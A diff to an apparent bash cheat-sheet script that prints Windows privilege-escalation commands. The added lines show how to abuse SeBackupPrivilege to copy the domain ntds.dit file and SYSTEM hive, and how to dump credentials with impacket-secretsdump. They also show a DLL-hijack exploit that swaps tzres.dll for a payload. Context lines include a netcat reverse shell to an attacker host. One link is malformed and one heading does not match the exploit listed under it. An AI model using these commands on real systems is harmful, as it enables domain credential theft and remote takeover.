@@ -94,8 +94,37 @@ echo -e "${Point} .\PrintSpoofer64.exe -i -c cmd"
 echo -e ""
 
 
+echo -e "${Frame}###${End} ${Title}SeBackupPrivilege${End} ${Frame}###${End}"
+echo -e "${Link}HackTheBox - Blackfield${End}"
+echo -e "${Point} Method 1 - Copy-FileSeBackupPrivilege"
+echo "    upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll"
+echo "    upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll"
+echo "    import-module .\SeBackupPrivilegeCmdLets.dll"
+echo "    import-module .\SeBackupPrivilegeUtils.dll"
+echo "    Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit ."
+echo -e ""
+echo -e "${Point} Method 2 - wbadmin"
+echo "    net use Z: \\\\\$kali\smb"
+echo "    echo 'Y' | wbadmin start backup -backupTarget:\\\\\$kali\smb -include:c:\windows\ntds"
+echo "    wbadmin get versions"
+echo "    echo 'Y' | wbadmin start recovery -version:??/??/20??-??:?? -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\Users\Public\Documents\ -notrestoreacl"
+echo "    reg save HKLM\SYSTEM C:\Users\Public\Documents\system.hive"
+echo "    impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL"
+echo -e ""
+
+
+
 echo -e "${Frame}###${End} ${Title}SeRestorePrivilege${End} ${Frame}###${End}"
 echo -e "${Link}https://github.com/xct/SeRestoreAbuse.git${End}"
 echo -e "${Link}https://github.com/dxnboy/redteam.git${End}"
 echo -en "${Point}" && echo ".\SeRestoreAbuse.exe \"cmd /c C:\path\to\nc.exe \$kali \$port -e cmd.exe\""
 echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}SeChangeNotifyPrivilege${End} ${Frame}###${End}"
+echo -e "${Link}https://ghttps://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public${End}"
+echo -e "${Point} .\SeManageVolumeExploit.exe"
+echo -n "    C:\Windows\System32\wbem\tzres.dll" && echo -e "${Comment} # replace the dll to payload${End}"
+echo -e "    systeminfo ${Comment}# trigger payload${End}"
+echo -e ""
+
